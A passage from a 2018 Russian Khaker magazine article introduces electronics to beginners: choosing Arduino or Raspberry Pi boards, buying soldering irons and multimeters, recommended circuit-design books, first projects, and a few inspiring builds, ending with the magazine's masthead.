у них много важных отличий: больше входов и выходов, больше ОЗУ
и флеш‐памяти. А модель Micro выделяется своими раз мерами — все‐
го 4,8 на 1,77 см.
  К тому же у Arduino есть многочисленные клоны, многие из которых
по качеству не уступают оригиналу. Стоить они могут дешевле, но совмести‐
мы с софтом и модуля ми для Arduino. Нет ничего особенно зазорного
в покупке клона, поскольку дизайн Arduino опенсорсный. А вот за сборку
и качество ком понентов кло нов отвечают только их производители. Также
различаться могут размеры и разводка, расположение кнопок и светоди‐
одов — в тех рамках, что не меша ют совместимос ти с периферией.





                Мно гочис ленные клоны Arduino


             INFO

                           Craftduino,   Seeeduino,   Freeduino,   Robotdyn,
                           Iteaduino — зарубежные аналоги Arduino, сопос‐
                      тавимые по качеству с оригиналом. «Ваниль»
                      и Iskra — российские. Кстати, у компании Iskra
                         есть и собственные модули.


Ты можешь заказать пла ту по очень при ятной цене на «Алиэкспрессе»,
но проблема в том, что нет простого способа отличить качественный клон
от некачественного по фотографии. Брак быва ет малозаметен, как изоб‐
ражено на картинке.





               Различия меж ду оригиналом и фальшивкой

Однако если тебе уже попалась нерабочая пла та, то и ее при желании (и
некотором уме нии) можно починить.
  Другая  распространенная  проблема  с дешевыми  китай скими  кло‐
нами — это использование чипа CH340 вместо ATmega. Если видишь Arduino
за пару сотен рублей, то там наверняка сто ит именно CH340. Однако для его
поддержки нужно всего лишь уста новить дру гой драйвер, так что экономия
может быть оправданной.
   Что же касается Raspberry Pi, это компьютер со своей операционной сис‐
темой, на него даже можно уста новить боль шинство программ для Linux
(если есть сборка для ARM или если удастся соб рать из исходных кодов).
Из Raspberry  Pi делают игровые приставки, камеры видеонаблюдения,
устройства с тачскринами и серверы для хра нения электронной библиотеки.
   Если для твоего проекта нужен полноценный компьютер с разнообразием
утилит и библиотек, то Raspberry Pi или Raspberry Pi Zero W — отличный,
хорошо  поддерживаемый  разработ чиками  и  сообществом  вариант.
При желании ты можешь связать Arduino и Raspberry Pi, чтобы они работали
в симбиозе: например, нес колько микроконтрол леров Arduino будут собирать
информацию с датчиков, а Raspberry Pi обрабатывать ее.


НЕСКОЛЬКО СОВЕТОВ НАЧИНАЮЩИМ
На первых этапах невоз можно не совершать ошиб ки, это неиз бежная часть
обучения. Но тем не менее было бы жес токо не поделиться советами,
которые сэкономят тебе время, деньги и нервы.
 • Бери готовые модули, чтобы первое время не паять. Когда я спалил свой
   первый модуль Bluetooth, это на некоторое время отбило мне желание
   работать с Arduino.
 • Не нужно сразу покупать мно го наборов и деталей. Если в арсенале све‐
   тодиодная матрица, камера, дат чик шума и дру гие игрушки, становится
   сложно закончить хотя бы один проект. А как мож но скорее получить пер‐
   вый результат — это очень важно, чтобы не растерять энту зиазм по пути.
 • При выборе проекта ориентируйся на его уровень: не стоит начинать
   со сложного. Скорее всего, это превратится в простое копирование,
   которое не принесет тебе удо вольствия и профита. Самое главное
   на этом этапе — удачно выбрать проект, в противном случае у тебя может
   пропасть желание заниматься этим дальше. (А дальше — только инте рес‐
   нее!)
 • Очень полезна будет макетная пла та. Для начала лучше взять большую:
   с ней легче работать, ты не запутаешь ся в проводах и сможешь лучше
   разобраться в процессе. Сэкономленные 60 рублей счастья не принесут,
   а с большой платой будет в разы приятнее и эффективнее работать.





                     Ма кетная плата


ВРЕМЯ ПАЯТЬ!
Когда‐нибудь это время обязательно нас танет. Скорее всего, это случится,
когда ты возьмешься за собственный проект, в котором тебе будут нужны
немодульные детали. Тогда придется делать новые модули или травить схе‐
му. В любом случае — паять придется. А вот чем — другой вопрос.
  Меня вполне устраивает мой паяльник за 200 рублей (можно сказать,
собираю все на коленках!). Однако, что бы ты ни выб рал, элементарную тех‐
нику безопасности ник то не отменял: заранее убирай посторонние (в осо‐
бенности — легко воспламеня ющиеся) предметы со стола, обеспечь провет‐
ривание и не пренебрегай защит ными очками — они, скорее всего, будут
продаваться там же, где и паяльник.





               Подоб ным паяльником пользуюсь я

Прежде чем покупать паяльную станцию, советую приобрести обычный
паяльник и попробовать порабо тать с ним. Стабильная температура, которую
обеспечит станция, бывает полезной при пайке микросхем, но в остальных
случаях не очень‐то нужна. Кстати, по сво ему опы ту пайки SMD могу сказать,
что это реально сделать и обычным паяльником, просто нужно иметь пару
запасных деталей на случай, если спалишь.
  Паяльники, конеч но, тоже бывают разные. Рекомендую брать девайс
со сменным жалом — для большей гибкости. Нагреватель обычно совету ют
керамический, как более долговечный. Однако тебе, скорее всего, не нужно
будет работать с ним каж дый день, поэтому подойдет и более дешевый —
нихромовый.
  При покупке паяльника стоит взять и подставку для него: ждать, пока инс‐
трумент остынет или нагреется, скучно. Особенно тоскливо, если ты должен
держать его все время в руке. И даже не думай оставлять его на столе и ухо‐
дить курить!





                      Паяльная станция

Что до паяльных станций, то они безопаснее и удоб нее, однако и значительно
дороже. По сути, паяльная станция — апгрейд паяль ника. Самая простая вер‐
сия будет включать в себя подставку и контрольный модуль. В нем — монитор
для отображения текущей температу ры и ручка‐регулятор. Комплектация
паяльной станции может варьировать ся в зависимос ти от цены. В комплекте
может быть вакуумный пинцет, оло воотсос, фен для локального подогрева
и еще много интересных приспособлений.


                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ

  Я У МАМЫ ИНЖЕНЕР
                КАК ПЕРЕСТАТЬ БОЯТЬСЯ ПАЯЛЬНИКА
                          И НАЧАТЬ ТВОРИТЬ





МУЛЬТИМЕТР ТЕБЕ В ПОМОЩЬ
Возможно, со времен вось мого клас са (или того, в котором в твоей школе
проходили электричество и магнетизм) ты помнишь, кто такие амперметр
и вольтметр. Мультиметр, или, по паспорту, «прибор измерительный универ‐
сальный», делает все то же самое, что эти ребята, и еще кое‐что. Он позволя‐
ет измерять напряжение, работос пособ ность цепи, силу тока, температуру
и коэффициент усиления транзисто ра.
  В зависимости от модели характеристики варь иру ются, но все такие при‐
боры многофункциональ ны. Самая зна мени тая марка — DT, дешево и сер‐
дито. Если хочешь сразу что‐то более продвинутое, то обычно совету ют Mas‐
tech или HoldPeak.





                     Мультиметр серии DT‐800

Мультиметр нужен в первую очередь для того, чтобы проверять, как теория
сходится с практикой. Наг ревание элементов и паразитные токи могут влиять
на конечный результат, поэто му нам нужен контролирующий прибор. Ну
и конечно, при необ ходимости (и ради научного интереса) на работоспособ‐
ность можно проверять отдельные детали.
  Даже навороченный мультиметр прост  в использовании. Выбираем
режим, прикладываем щупы к нужным мес там и снимаем показания. Режим
зависит от того, какую характеристику измеряем и в каких пределах. Харак‐
теристики на мультиметрах выделены в отдельные рамки с подписью, в этих
рамках мы и выбираем второй параметр — пределы измерения.
  Признаюсь, у меня нет мультимет ра, и для некоторых проектов мне при‐
ходилось одалживать его у зна комых. Советую тебе при обрести его по одной
простой причине: с ним будет легче. Не придет ся лишний раз ломать голову,
почему что‐то не работа ет, — можно просто про верить.

Про екти рова ние и рас чет схем: где научить ся
В этой статье мы не будем углубляться в про ектирова ние схем: материала тут
огромное количество, но он неплохо покрыт школь ной (а у кого‐то и институт‐
ской) программой и литера турой.
   Если ты все проспал, но неплохо понимаешь английский, то можешь
начать с лекций на «Академии Хана» — они бесплат ны, очень доходчивы и от
самых азов постепенно переходят к бо лее серь езным темам. Есть даже не‐
большой курс, в котором объясня ют устройство бытовых приборов: электрон‐
ных часов, кофеварки, фена и так далее.
   Если же хочется что‐то на русском, то твоя дорога лежит в книжный
магазин, техническую библиотеку или их ана логи в интернете. Вот три книги,
которые я рекомендую пос мотреть в первую очередь.





 1. «Искусство схе мотехники», П. Хоровиц и У. Хилл
     Первая глава «Основы электроники» — практически школьный курс
   физики. Изложено все доступным языком, кни га даст все необ ходимое,
   чтобы освоиться с нуля, или поможет восполнить пробелы и системати‐
   зировать знания тем, кто уже зна ком со схемотехникой. На форумах
   пишут, что книга ста рая и упущены «тонкие моменты». Но почему‐то
   не говорят, что именно упущено.
 2. «Осно вы схе мотехники», Е. Воробьева, В. Иван ченко
     Книга представляет собой конспект лекций. Плюс — краткость изло‐
   жения. Минус оче видный: новичку эта книга может быть сложновата.
 3. «Цифровая схе мотехника и архитек тура компьюте ра», Д. Хэр-
  рис и С. Хэррис
     Отличная книга, о которой слышал каж дый, кто хоть когда‐нибудь инте‐
   ресовался архитектурой компь ютера. Здесь раз бираются языки описания
   аппаратуры — SystemVerilog и VHDL.

Если у тебя нет времени на чтение, то понять, что у чему, поможет ПО для
моделирования схем (или послужит наглядной иллюс трацией к прочитан‐
ному). Из наиболее продвинутых можешь пос мотреть  LTspice,  DipTrace
и опенсорсный Qucs. Но вариантов мас са, есть даже бесплатные симуля‐
торы, работающие прямо в браузере.





               Пример схемы, разведенной в DipTrace





ПЕРВЫЙ ПРОЕКТ
Аналог «Hello world!» в электронике — это мигание светодиодом. В качестве
первого проекта — самое то. Если захочешь усложнить, делай светодиодную
матрицу, на которую можно выводить пиксельную картинку или даже ани‐
мацию. Добавь пару кнопок, и готов игро вой автомат, на котором пойдет
«Змейка». Дальше можешь освоить модули, которые тебе приглянутся,
— например, для измерения температу ры и влажности в комнате.
  Все это займет не так много времени, зато даст освоиться с базовы ми
навыками и вдохновиться на дальнейшее раз витие. Теперь более сложный
проект как минимум не будет казать ся таким уж страшным.
   Если ты все еще не придумал, что хочешь сделать, но уже определился
с платформой, то в интернете ты обязательно найдешь что‐нибудь по вкусу.
Если ты выбрал Raspberry Pi, есть смысл заглянуть на Qwrt, в блог Imena.ua
и на сайт projects.raspberrypi.org.
   Если же твой выбор пал на микроконтроллер Arduino, тебя впечатлит
выбор проектов на cxem.net и на arduino.cc.


ПРИМЕРЫ ДЛЯ ВДОХНОВЕНИЯ
Напоследок я хочу расска зать о нес кольких кру тых проектах, которые дол жны
подогреть твой интерес еще больше.
  В свое время меня впечатлило ус трой ство на базе Arduino, которое спо‐
собно взломать навесной кодовый замок приб лизительно за пять минут.
При предварительном тесте замка количество комбинаций для перебора
можно уменьшить в десять раз.





                     Ус трой ство для взлома замка

Если тебе больше нра вятся роботы, то обрати внимание на собранную
из труб ПВХ рыбу‐робота. На мой вкус — выда ющийся экземпляр робототех‐
ники. Его можно использовать для изу чения водоема или же сделать аква‐
риум с такими жильцами для собственного удовольствия. А для соз дания
подобной рыбы нужно не так много: водонепроницаемые сервопри воды
и контроллер Arduino.





             Впол не реалистичная роборы ба из трубы ПВХ

Из Raspberry Pi можно сделать самопальный компь ютер или планшет, но это
не очень‐то захватывающе. По крайней мере, в сравнении со стратос татом
на Raspberry Pi, который сделает замеча тельные снимки или запишет видео.
Кое‐кто даже запустил в небо Супермена, где ему и место. Супергерой дос‐
тиг значительной высоты — 35,5 км.





                          Полет

Я постарался рассказать здесь о самых азах, но чем глубже изучаешь вопрос,
тем интереснее становится. Надеюсь, мои советы пригодятся тебе и ты соз‐
дашь что‐нибудь потряса ющее. А если уже соз дал и готов поделиться
с миром своим изоб ретением, то обязательно дай знать редакции «Хакера»!
   №10 (235)
             Илья Русанен          Алексей Глазков       Андрей Письменный
              Главный редактор       Выпускающий редактор         Шеф‐редактор
                rusanen@glc.ru               glazkov@glc.ru             pismenny@glc.ru
                                 Евгения Шарипова
                                     Литературный редактор


                           РЕДАКТОРЫ РУБРИК
          Андрей Пись мен ный        Илья Русанен          Александр «Dr.»
               pismenny@glc.ru             rusanen@glc.ru            Лозовский
                                                                           lozovsky@glc.ru
          Иван «aLLy» Андреев       Евгений Зобнин          Тать яна Чупрова
            iam@russiansecurity.expert          zobnin@glc.ru              chuprova@glc.ru


                          MEGANEWS
                           Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ
                                      yambuto
                                      yambuto@gmail.com


                               РЕКЛАМА

                                  Анна Яковлева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                             Вопросы по под писке: lapina@glc.ru
                            Вопросы по материалам: support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, ком ната 54, офис 7. Зарегистри ровано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых ком муника ций (Роскомнадзоре), свидетельство Эл № ФС77‐67001 от 30.
08.2016 года. Мнение редакции не обязатель но совпада ет с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответс твен ности. Редакция
не несет ответственности за содер жание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов жур нала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2018